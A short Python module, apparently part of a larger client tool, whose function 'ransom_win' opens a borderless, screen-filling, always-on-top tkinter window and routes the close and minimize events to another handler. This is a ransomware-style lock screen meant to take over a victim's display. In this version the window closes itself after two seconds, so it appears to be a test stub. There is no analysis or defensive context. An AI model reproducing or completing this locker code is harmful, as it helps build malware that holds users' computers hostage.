import requests
from Client.finals import Finals as final
from apscheduler.schedulers.blocking import BlockingScheduler
from threading import Thread
from Client.assisting import *
from Client.devcon_automations import *
from time import sleep
import tkinter as tk




def ransom_win():
    msg = get(final.messageField)
    wa = tk.Tk()
    wa.title('Defensive Blocks')
    wa.overrideredirect(True)
    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))
    wa.focus_set()  # <-- move focus to this widget
    wa.protocol("WM_DELETE_WINDOW", exb)
    wa.protocol("WM_MINIMIZE_WINDOW", exb)
    lb1 = tk.Label(wa, text="RFr", font=("Arial Bold", 70), pady=200, fg="RED")
    lb1.pack()
    wa.call('wm', 'attributes', '.', '-topmost', '1')
    while 1:
        wa.update()
        print(wa.winfo_ismapped())
        sleep(2)
        wa.destroy()
        return


ransom_win()
